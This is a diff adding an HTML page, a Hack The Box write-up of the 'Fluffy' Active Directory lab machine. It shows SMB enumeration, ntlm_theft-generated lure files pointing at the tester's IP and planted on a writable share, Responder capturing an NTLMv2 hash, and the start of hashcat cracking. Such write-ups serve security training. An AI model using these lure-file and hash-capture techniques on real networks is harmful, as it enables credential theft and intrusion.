@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Fluffy | Paracausal Telemetry</title><meta name="description" content="Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Watering hole attack, Kerberoasting." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fluffy/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Fluffy" /><meta property="og:description" content="Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Watering hole attack, Kerberoasting." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fluffy/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fluffy/og.png?v=bd2f2c71" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Fluffy" /><meta name="twitter:description" content="Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Watering hole attack, Kerberoasting." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fluffy/og.png?v=bd2f2c71" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Fluffy","description":"Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Watering hole attack, Kerberoasting.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fluffy/","datePublished":"2026-04-06","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Fluffy","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fluffy/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Fluffy</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-04-06 · 15 min read</p><h1>Fluffy</h1><p>Easy Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Watering hole attack, Kerberoasting.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · easy</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Fluffy" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-fluffy.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-fluffy.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Fluffy</h2><p>Fluffy is an easy-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. By exploiting [CVE-2025-24071](https://nvd.nist.gov/vuln/detail/CVE-2025-24071), the credentials of another low-privileged user can…</p></div><span class="room-badge room-badge-easy">Easy</span></div><dl class="room-facts"><div><dt>Released</dt><dd>24 May 2025</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creators</dt><dd>ruycr4ft, kavigihan</dd></div><div><dt>Rating</dt><dd>4.4 / 5</dd></div><div><dt>User owns</dt><dd>10,954</dd></div><div><dt>Root owns</dt><dd>9,865</dd></div><div><dt>User blood</dt><dd>snowscan<small class="room-blood-time">0H 15M 27S</small></dd></div><div><dt>Root blood</dt><dd>NLTE<small class="room-blood-time">0H 51M 6S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 11149 votes from easiest to hardest"><rect x="0" y="58" width="20" height="6" rx="2" fill="hsl(96 70% 55%)"><title>331 votes</title></rect><rect x="26" y="56" width="20" height="8" rx="2" fill="hsl(96 70% 55%)"><title>400 votes</title></rect><rect x="52" y="20" width="20" height="44" rx="2" fill="hsl(80 70% 55%)"><title>2344 votes</title></rect><rect x="78" y="0" width="20" height="64" rx="2" fill="hsl(70 70% 55%)"><title>3392 votes</title></rect><rect x="104" y="21" width="20" height="43" rx="2" fill="hsl(50 70% 55%)"><title>2273 votes</title></rect><rect x="130" y="43" width="20" height="21" rx="2" fill="hsl(38 70% 55%)"><title>1123 votes</title></rect><rect x="156" y="49" width="20" height="15" rx="2" fill="hsl(28 70% 55%)"><title>788 votes</title></rect><rect x="182" y="59" width="20" height="5" rx="2" fill="hsl(16 70% 55%)"><title>250 votes</title></rect><rect x="208" y="62" width="20" height="2" rx="2" fill="hsl(8 70% 55%)"><title>72 votes</title></rect><rect x="234" y="61" width="20" height="3" rx="2" fill="hsl(0 70% 55%)"><title>176 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 6.7, Real-Life 6.8, CVE 6.3, Custom Exploitation 3.7, CTF-Like 3.2"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,63.1 155.3,95.3 135.9,145.7 94.8,131.0 88.7,103.1" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Fluffy" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Starting credentials</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">j.fleischman:J0elTHEM4n1990!</code></pre><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.232.88 --generate-hosts-file /etc/hosts                 
+[sudo] password for kali: 
+SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT 10.129.232.88                                 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-24 18:05 +0000
+Nmap scan report for 10.129.232.88
+Host is up (0.014s latency).
+Not shown: 65517 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49667/tcp open  unknown
+49689/tcp open  unknown
+49690/tcp open  unknown
+49697/tcp open  unknown
+49707/tcp open  unknown
+49720/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 66.31 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,88,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT dc01.fluffy.htb
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-24 18:07 +0000
+Nmap scan report for dc01.fluffy.htb (10.129.232.88)
+Host is up (0.015s latency).
+rDNS record for 10.129.232.88: DC01.fluffy.htb
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-25 01:07:43Z)
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+| Not valid before: 2025-04-17T16:04:17
+|_Not valid after:  2026-04-17T16:04:17
+|_ssl-date: 2026-03-25T01:09:10+00:00; +7h00m01s from scanner time.
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-25T01:09:09+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+| Not valid before: 2025-04-17T16:04:17
+|_Not valid after:  2026-04-17T16:04:17
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-25T01:09:10+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+| Not valid before: 2025-04-17T16:04:17
+|_Not valid after:  2026-04-17T16:04:17
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-03-25T01:09:09+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+| Not valid before: 2025-04-17T16:04:17
+|_Not valid after:  2026-04-17T16:04:17
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p>DC is running at +7h</p><h2>SMB (445)</h2><p>Null auth is enabled but cant access shares or list users</p><h3>Guest access</h3><h4>Shares</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.fluffy.htb -u &#39;Guest&#39; -p &#39;&#39; --shares 
+SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.88   445    DC01             [+] fluffy.htb\Guest: 
+SMB         10.129.232.88   445    DC01             [*] Enumerated shares
+SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
+SMB         10.129.232.88   445    DC01             -----           -----------     ------
+SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.232.88   445    DC01             C$                              Default share
+SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.232.88   445    DC01             IT                              
+SMB         10.129.232.88   445    DC01             NETLOGON                        Logon server share 
+SMB         10.129.232.88   445    DC01             SYSVOL                          Logon server share</code></pre><p>Limited access on shares</p><h4>Users</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.fluffy.htb -u &#39;Guest&#39; -p &#39;&#39; --rid-brute             
+SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.88   445    DC01             [+] fluffy.htb\Guest: 
+SMB         10.129.232.88   445    DC01             498: FLUFFY\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             500: FLUFFY\Administrator (SidTypeUser)
+SMB         10.129.232.88   445    DC01             501: FLUFFY\Guest (SidTypeUser)
+SMB         10.129.232.88   445    DC01             502: FLUFFY\krbtgt (SidTypeUser)
+SMB         10.129.232.88   445    DC01             512: FLUFFY\Domain Admins (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             513: FLUFFY\Domain Users (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             514: FLUFFY\Domain Guests (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             515: FLUFFY\Domain Computers (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             516: FLUFFY\Domain Controllers (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             517: FLUFFY\Cert Publishers (SidTypeAlias)
+SMB         10.129.232.88   445    DC01             518: FLUFFY\Schema Admins (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             519: FLUFFY\Enterprise Admins (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             520: FLUFFY\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             521: FLUFFY\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             522: FLUFFY\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             525: FLUFFY\Protected Users (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             526: FLUFFY\Key Admins (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             527: FLUFFY\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             553: FLUFFY\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.232.88   445    DC01             571: FLUFFY\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.232.88   445    DC01             572: FLUFFY\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.232.88   445    DC01             1000: FLUFFY\DC01$ (SidTypeUser)
+SMB         10.129.232.88   445    DC01             1101: FLUFFY\DnsAdmins (SidTypeAlias)
+SMB         10.129.232.88   445    DC01             1102: FLUFFY\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             1103: FLUFFY\ca_svc (SidTypeUser)
+SMB         10.129.232.88   445    DC01             1104: FLUFFY\ldap_svc (SidTypeUser)
+SMB         10.129.232.88   445    DC01             1601: FLUFFY\p.agila (SidTypeUser)
+SMB         10.129.232.88   445    DC01             1603: FLUFFY\winrm_svc (SidTypeUser)
+SMB         10.129.232.88   445    DC01             1604: FLUFFY\Service Account Managers (SidTypeGroup)
+SMB         10.129.232.88   445    DC01             1605: FLUFFY\j.coffey (SidTypeUser)
+SMB         10.129.232.88   445    DC01             1606: FLUFFY\j.fleischman (SidTypeUser)
+SMB         10.129.232.88   445    DC01             1607: FLUFFY\Service Accounts (SidTypeGroup)</code></pre><p>Here is the list of users but since i have credentials i can use nxc <code>users-export</code> function to dump all the users to a file for me</p><h3>Using provided creds</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">j.fleischman:J0elTHEM4n1990!</code></pre><h4>Shares</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.fluffy.htb -u &#39;j.fleischman&#39; -p &#39;J0elTHEM4n1990!&#39; --shares
+SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
+SMB         10.129.232.88   445    DC01             [*] Enumerated shares
+SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
+SMB         10.129.232.88   445    DC01             -----           -----------     ------
+SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.232.88   445    DC01             C$                              Default share
+SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.232.88   445    DC01             IT              READ,WRITE      
+SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share</code></pre><p>Write access on the <code>IT</code> share</p><h4>Users</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.fluffy.htb -u &#39;j.fleischman&#39; -p &#39;J0elTHEM4n1990!&#39; --users-export users.txt
+SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
+SMB         10.129.232.88   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         10.129.232.88   445    DC01             Administrator                 2025-04-17 15:45:01 0       Built-in account for administering the computer/domain
+SMB         10.129.232.88   445    DC01             Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain
+SMB         10.129.232.88   445    DC01             krbtgt                        2025-04-17 16:00:02 0       Key Distribution Center Service Account
+SMB         10.129.232.88   445    DC01             ca_svc                        2025-04-17 16:07:50 0        
+SMB         10.129.232.88   445    DC01             ldap_svc                      2025-04-17 16:17:00 0        
+SMB         10.129.232.88   445    DC01             p.agila                       2025-04-18 14:37:08 0        
+SMB         10.129.232.88   445    DC01             winrm_svc                     2025-05-18 00:51:16 0        
+SMB         10.129.232.88   445    DC01             j.coffey                      2025-04-19 12:09:55 0        
+SMB         10.129.232.88   445    DC01             j.fleischman                  2025-05-16 14:46:55 0        
+SMB         10.129.232.88   445    DC01             [*] Enumerated 9 local users: FLUFFY
+SMB         10.129.232.88   445    DC01             [*] Writing 9 local users to users.txt</code></pre><p>All users dumped to a user file</p><h3><code>IT</code> share</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient //dc01.fluffy.htb/IT -U &#39;j.fleischman&#39;%&#39;J0elTHEM4n1990!&#39;                        
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Wed Mar 25 01:14:15 2026
+  ..                                  D        0  Wed Mar 25 01:14:15 2026
+  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 16:08:44 2025
+  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 16:04:05 2025
+  KeePass-2.58                        D        0  Fri Apr 18 16:08:38 2025
+  KeePass-2.58.zip                    A  3225346  Fri Apr 18 16:03:17 2025
+  Upgrade_Notice.pdf                  A   169963  Sat May 17 15:31:07 2025
+
+		5842943 blocks of size 4096. 1533508 blocks available
+smb: \&gt;</code></pre><p>Ive copied all this to my machine</p><p>Nothing really in any of these files there are details about CVEs that i could try</p><h2>Watering hole attack</h2><p>With write access to a share i can perform this</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo responder -I tun0</code></pre><p>Ill start by setting a listener</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 ntlm_theft.py -g modern -s 10.10.14.90 -f meeting
+/home/kali/htb/fluffy/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence &#39;\l&#39;
+  location.href = &#39;ms-word:ofe|u|\\&#39;&#39;&#39; + server + &#39;&#39;&#39;\leak\leak.docx&#39;;
+Skipping SCF as it does not work on modern Windows
+Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
+Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
+Created: meeting/meeting.lnk (BROWSE TO FOLDER)
+Created: meeting/meeting.rtf (OPEN)
+Created: meeting/meeting-(stylesheet).xml (OPEN)
+Created: meeting/meeting-(fulldocx).xml (OPEN)
+Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(includepicture).docx (OPEN)
+Created: meeting/meeting-(remotetemplate).docx (OPEN)
+Created: meeting/meeting-(frameset).docx (OPEN)
+Created: meeting/meeting-(externalcell).xlsx (OPEN)
+Created: meeting/meeting.wax (OPEN)
+Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: meeting/meeting.asx (OPEN)
+Created: meeting/meeting.jnlp (OPEN)
+Created: meeting/meeting.application (DOWNLOAD AND OPEN)
+Created: meeting/meeting.pdf (OPEN AND ALLOW)
+Skipping zoom as it does not work on the latest versions
+Created: meeting/meeting.library-ms (BROWSE TO FOLDER)
+Skipping Autorun.inf as it does not work on modern Windows
+Skipping desktop.ini as it does not work on modern Windows
+Created: meeting/meeting.theme (THEME TO INSTALL
+Generation Complete.</code></pre><p>Ill use a tool called <code>ntlm_theft</code> to craft the malicious files</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient //dc01.fluffy.htb/IT -U &#39;j.fleischman&#39;%&#39;J0elTHEM4n1990!&#39;
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; put meetin*
+meetin* does not exist
+smb: \&gt; mput meeting*</code></pre><p>This planted the files in the share</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[SMB] NTLMv2-SSP Client   : 10.129.232.88
+[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:b3dbfd88351e1847:15407440A3EF41C7B58618569179C465:0101000000000000808D08C6BBBBDC018A226B164BA1EABE0000000002000800500041005300310001001E00570049004E002D0053004B0030004A00590041004800480049005600590004003400570049004E002D0053004B0030004A0059004100480048004900560059002E0050004100530031002E004C004F00430041004C000300140050004100530031002E004C004F00430041004C000500140050004100530031002E004C004F00430041004C0007000800808D08C6BBBBDC01060004000200000008003000300000000000000001000000002000008BBA22F24B2400441813D41965452FAC8097ADB8978201BB13248A4DB5B6C8840A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390030000000000000000000</code></pre><p>I now have a hash</p><h3>Cracking the hash</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat p-agila.hash /usr/share/wordlists/rockyou.txt
+
